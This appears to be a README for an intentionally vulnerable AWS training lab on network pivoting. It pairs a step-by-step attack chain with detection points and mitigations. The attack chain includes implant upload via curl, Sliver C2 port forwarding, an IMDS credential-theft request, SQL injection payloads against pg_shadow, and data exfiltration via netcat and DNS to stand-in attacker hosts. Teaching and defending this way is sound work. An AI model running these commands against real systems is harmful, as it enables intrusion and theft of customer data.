# Branch 5: Network Segmentation & Pivoting

## Overview

Branch 5 demonstrates advanced network segmentation bypass techniques and lateral movement through a multi-tier architecture. This branch introduces:

- **Network Segmentation**: Public, private, and database subnets with restrictive NACLs
- **Multi-tier Architecture**: Web server → Backend API → PostgreSQL database
- **Security Groups & NACLs**: Defense-in-depth network controls
- **Pivoting Requirements**: Attackers must pivot through compromised hosts
- **Data Exfiltration**: Multiple techniques for extracting sensitive data

## Architecture

```
Internet
    │
    ├── Bastion Host (10.0.1.0/24 - Public Subnet)
    │   ├── Sliver C2 Server
    │   └── Attack orchestration
    │
    ├── Web Server (10.0.1.0/24 - Public Subnet)
    │   ├── File upload vulnerability
    │   ├── Proxies to Backend API
    │   └── Initial compromise point
    │
    ├── NAT Gateway
    │
    ├── Backend API (10.0.2.0/24 - Private Subnet)
    │   ├── No direct internet access
    │   ├── SQL injection vulnerability
    │   ├── IMDSv1 enabled
    │   └── Database credentials in Secrets Manager
    │
    └── PostgreSQL RDS (10.0.10.0/24, 10.0.11.0/24 - Database Subnets)
        ├── Customer PII data
        ├── Credit card information
        └── Only accessible from Backend API
```

## Network Security Controls

### Security Groups
- **Bastion**: SSH from anywhere, outbound all
- **Web Server**: HTTP/8080 from anywhere, outbound all
- **Backend API**: Port 8081 only from Web Server SG
- **RDS**: Port 5432 only from Backend API SG

### Network ACLs
- **Public Subnet**: Allows SSH, HTTP/8080, HTTPS
- **Private Subnet**: Only allows traffic from public subnet
- **Database Subnet**: Only allows PostgreSQL from private subnet

## Attack Chain

### Phase 1: Initial Compromise
```bash
# Upload shell to web server
curl -X POST -F 'file=@implant.elf' http://<web-server>:8080/upload

# Execute implant
ssh ec2-user@<web-server>
/var/www/uploads/implant.elf &
```

### Phase 2: Internal Reconnaissance
```bash
# From Sliver C2 session
sliver (web-server) > ifconfig
sliver (web-server) > netstat -an
sliver (web-server) > execute -o "cat /etc/hosts"

# Discover backend API
# backend-api.internal -> 10.0.2.X
```

### Phase 3: Pivoting to Backend API
```bash
# Set up port forward through compromised web server
sliver (web-server) > portfwd add -r 10.0.2.X:8081 -l 9001

# Access backend API through tunnel
curl http://localhost:9001/api/customers
```

### Phase 4: Backend API Exploitation

#### Option A: IMDS Credential Theft
```bash
# Backend has IMDSv1 enabled
curl http://localhost:9001/../fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

#### Option B: SQL Injection
```bash
# Exploit SQL injection vulnerability
curl "http://localhost:9001/api/customers/search?q=' OR 1=1--"

# Extract database credentials
curl "http://localhost:9001/api/customers/search?q=' UNION SELECT null,null,null,password,null,null FROM pg_shadow--"
```

### Phase 5: Database Access
```bash
# Create tunnel to RDS through backend API
sliver (web-server) > portfwd add -r <rds-endpoint>:5432 -l 5432

# Connect to database
PGPASSWORD=<password> psql -h localhost -U dbadmin -d customerdb

# Dump sensitive data
\copy customers TO '/tmp/customers.csv' CSV HEADER;
```

### Phase 6: Data Exfiltration

#### Sliver C2 Method:
```bash
sliver (web-server) > download /tmp/customers.csv ./stolen_data.csv
```

#### Netcat Method:
```bash
# On attacker machine
nc -l -p 9999 > stolen_data.tar.gz

# On compromised host
tar czf - /tmp/*.csv | nc <attacker-ip> 9999
```

#### DNS Exfiltration:
```bash
# Encode and chunk data
base64 /tmp/customers.csv | split -b 32 - chunk_

# Exfiltrate via DNS
for chunk in chunk_*; do
  nslookup $(cat $chunk).<attacker-domain>
done
```

## Vulnerable Components

### Web Server (`web-server/main.go`)
- File upload without validation
- Proxy to backend API
- IMDSv2 enforced (but has upload vulnerability)

### Backend API (`backend-api/main.go`)
- SQL injection in search endpoint
- IMDSv1 enabled (vulnerable)
- Stores database credentials

### Database
- Contains sensitive customer data
- Credit card numbers
- Social Security Numbers
- Financial information

## Deployment

### Prerequisites
```bash
# Install Terraform
# Configure AWS credentials
# Create EC2 key pair
```

### Deploy Infrastructure
```bash
cd terraform
terraform init
terraform plan -var-file=terraform.tfvars
terraform apply -auto-approve
```

### Terraform Variables (`terraform.tfvars`)
```hcl
region      = "us-east-1"
key_name    = "your-key-pair"
my_ip       = "your.ip.address/32"
db_password = "SecurePassword123!"  # Change this
```

## Monitoring & Detection

### CloudWatch Log Groups
- `/aws/ec2/imdsv1-lab/web-server` - Web server logs
- `/aws/ec2/imdsv1-lab/backend-api` - Backend API logs
- `/aws/ec2/imdsv1-lab/bastion` - Bastion/C2 logs
- RDS PostgreSQL logs

### Key Detection Points
1. **File Upload Activity**: Monitor `/upload` endpoint usage
2. **Port Forwarding**: Unusual network connections between tiers
3. **IMDS Access**: Requests to 169.254.169.254
4. **SQL Injection**: Malformed SQL queries in logs
5. **Data Staging**: Large files in /tmp directories
6. **Egress Traffic**: Unusual outbound connections

## Security Mitigations

### Network Level
1. **Implement Zero Trust**: Don't trust traffic even from internal networks
2. **Use PrivateLink**: Replace NAT with VPC endpoints
3. **Micro-segmentation**: Further segment the network
4. **Egress Filtering**: Restrict outbound traffic

### Application Level
1. **File Upload Security**:
   - Validate file types
   - Scan for malware
   - Store outside web root
   - Never execute uploaded files

2. **API Security**:
   - Implement authentication between services
   - Use API keys or mutual TLS
   - Rate limiting
   - Input validation

3. **Database Security**:
   - Use prepared statements (prevent SQL injection)
   - Encrypt data at rest and in transit
   - Implement database activity monitoring
   - Use read replicas for queries

### Instance Level
1. **IMDSv2**: Enforce on all EC2 instances
2. **SSM Session Manager**: Replace SSH with SSM
3. **Secrets Management**: Use AWS Secrets Manager with rotation
4. **Least Privilege IAM**: Minimal permissions per service

## Cleanup

```bash
# Destroy all resources
cd terraform
terraform destroy -auto-approve

# Clean up local files
rm -rf backend-api/
rm -rf pivoting-scripts/
rm -rf terraform/*.tf
```

## Learning Objectives

This branch teaches:
1. **Network Segmentation Limitations**: How attackers bypass network controls
2. **Lateral Movement**: Techniques for moving between network segments
3. **Pivoting**: Using compromised hosts as stepping stones
4. **Data Exfiltration**: Various methods to steal data
5. **Defense in Depth**: Why multiple security layers are necessary
6. **Detection Engineering**: What to monitor in segmented networks

## Additional Resources

- [AWS Network Security Best Practices](https://docs.aws.amazon.com/vpc/latest/userguide/VPC_Security.html)
- [MITRE ATT&CK - Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
- [Sliver C2 Documentation](https://github.com/BishopFox/sliver/wiki)
- [PostgreSQL Security](https://www.postgresql.org/docs/current/security.html)

---

**⚠️ WARNING**: This branch contains intentionally vulnerable code for educational purposes. Never deploy this in production environments. Always follow security best practices in real deployments.